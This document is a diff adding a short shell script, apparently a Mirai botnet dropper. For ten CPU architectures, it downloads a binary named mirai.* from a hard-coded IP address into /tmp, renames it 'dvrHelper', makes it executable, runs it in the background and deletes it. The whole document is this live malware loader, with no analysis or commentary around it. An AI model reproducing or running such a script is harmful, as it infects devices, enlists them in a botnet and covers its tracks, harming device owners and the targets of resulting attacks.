@@ -1,0 +1,12 @@
+#!/bin/sh
+cd /tmp; wget http://163.172.76.48/mirai.arm -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -fr dvrHelper &
+cd /tmp; wget http://163.172.76.48/mirai.arm5n -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -fr dvrHelper &
+cd /tmp; wget http://163.172.76.48/mirai.arm7 -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -fr dvrHelper &
+cd /tmp; wget http://163.172.76.48/mirai.ppc -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -fr dvrHelper &
+cd /tmp; wget http://163.172.76.48/mirai.m68k -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -fr dvrHelper &
+cd /tmp; wget http://163.172.76.48/mirai.sh4 -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -fr dvrHelper &
+cd /tmp; wget http://163.172.76.48/mirai.mips -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -fr dvrHelper &
+cd /tmp; wget http://163.172.76.48/mirai.spc -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -fr dvrHelper &
+cd /tmp; wget http://163.172.76.48/mirai.mpsl -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -fr dvrHelper &
+cd /tmp; wget http://163.172.76.48/mirai.x86 -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -fr dvrHelper &
+exit;
